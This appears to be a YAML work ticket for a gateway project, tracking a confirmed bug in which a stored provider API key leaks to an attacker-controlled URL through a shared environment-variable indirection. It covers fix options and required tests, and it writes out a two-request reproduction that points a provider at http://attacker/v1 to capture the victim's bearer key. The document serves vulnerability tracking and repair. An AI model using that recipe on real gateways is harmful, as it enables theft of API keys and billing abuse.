repo: charon
tier: strong
priority: 2
difficulty: 4
work_class: security
branch: fix/provider-key-exfil
parked: true
note: |
  DRAFT — CONFIRMED provider-API-key exfiltration, 3 bypasses found across 2 fix rounds
  (2026-07-19). Pre-existing on master. Partial fix on branch fix/provider-key-exfil
  (commit d83ce9a) closes the no-key aliasing path but the fresh-key escape hatch STILL
  LEAKS — do NOT land the partial (false sense of security). Full reviews:
  REVIEW-cg-lan-open-ui.md (finding 1), REVIEW-ssrf-fix.md, REVIEW-ssrf-fix-v2.md.
owns: src/charon/gateway.py, src/charon/config/providers.py, src/charon/secrets.py, src/charon/keyprobe.py, tests/test_provider_key_exfil.py
depends_on:
accept: |
  THE VULN (reproduced live 3x): a stored provider API key is exfiltrated to an
  attacker-controlled URL. Root cause is the `key_env` INDIRECTION — key_env is a shared
  env-var NAME, and the code validates one key but sends another:
    POST /charon/providers {name:evil, base_url:http://attacker/v1, key_env:VICTIM_KEY, key:sk-throwaway}
    POST /charon/models/import {provider:evil}  -> GET http://attacker/v1/models  Bearer <REAL VICTIM KEY>
  Mechanism: `validate_provider_key` (keyprobe.py:71) probes with the SUPPLIED key; the send
  site (models/import -> list_models, providers.py) reads `os.environ[key_env]` (the REAL
  key). `secrets.set_secret` writes the secrets FILE, but `apply_to_env` uses
  `os.environ.setdefault` (secrets.py:97) which NEVER overwrites an already-set env var — so
  a "freshly validated" key never becomes the key actually sent upstream.

  WHAT'S ALREADY DONE (branch d83ce9a, keep as starting point): the no-key aliasing path is
  closed (binding a key_env whose secret exists to an unvetted base is 400'd unless a fresh
  key validates); full-URL base comparison; F2 store backstop (drops inherited key on base
  change incl. base-less->base). These HOLD per review. The remaining hole is the fresh-key
  escape hatch itself.

  THE FIX (a small architecture decision — pick with a fresh head, do NOT rush):
  Option A: after `set_secret`, force `os.environ[key_env] = key` (overwrite, not setdefault)
    so a validated re-bind IS the key sent. CAVEAT: key_env can be SHARED across providers —
    overwriting clobbers the real key for all of them (and with an attacker throwaway). Must
    handle shared-key_env semantics or this breaks/leaks elsewhere.
  Option B (cleaner): keyed send sites read the secret from the secrets STORE (per-provider),
    NOT `os.environ`. Bigger change (touches the send path) but removes the indirection that
    is the root cause. LIKELY THE RIGHT ANSWER.
  Decide A vs B deliberately; the indirection is the real bug.

  MANDATORY tests (the current 15 are green while the leak is live — they assert only the
  secrets FILE + status codes, never what `import` SENDS, and use a non-preexisting key_env
  for the fresh-key case):
  - an IMPORT-OBSERVING regression: drive the full chain, assert the ATTACKER URL received
    NO real key (real observable), for BOTH new-provider-aliasing AND repoint variants, WITH
    a pre-existing victim key_env. Reverting the fix -> RED.
  - keep the no-key guard + F2 + legit-usage tests.
  - adversarial re-review REQUIRED before landing (3/3 rounds found a bypass; keys/money path).

  EXPOSURE (why deferrable, not why ignorable): pre-existing; `lan_open_ui` abandoned so
  /charon/* requires the token, so exploit needs the token (already game-over) or a CSRF
  trick on the authenticated operator's browser. Narrow on a single-operator LAN gateway,
  but REAL — fix it early next session.
scope: |
  Product gateway security fix. Keys/money path — adversarial review non-optional. Product-
  neutral (public repo). [[security-is-a-ratchet-gate]] [[never-ignore-preexisting-issues]]
ds: |
  ## Dependencies & sequence
  depends_on: NONE. Independent of the gateway MVP + LiteLLM adopt. Do FIRST next session
  (before adding providers like the requested Alibaba Cloud one — the fix changes how
  provider keys are validated/sent). Branch fix/provider-key-exfil (d83ce9a) is the base.
  repo: charon (public product).
blast_radius_note: |
  NEXT SESSION FIRST: assess blast radius + whether to redesign rather than patch. The
  shared `key_env` env-var-NAME indirection is the root of all 3 bypasses. The SIMPLE ELEGANT
  fix is likely Option B taken further: a per-provider secret keyed by PROVIDER ID (not a
  shared env-var name), so validation and send read the SAME per-provider secret and the
  indirection disappears entirely. Check callers of os.environ[key_env] / apply_to_env /
  set_secret for blast radius before choosing. Prefer removing the indirection over guarding it.
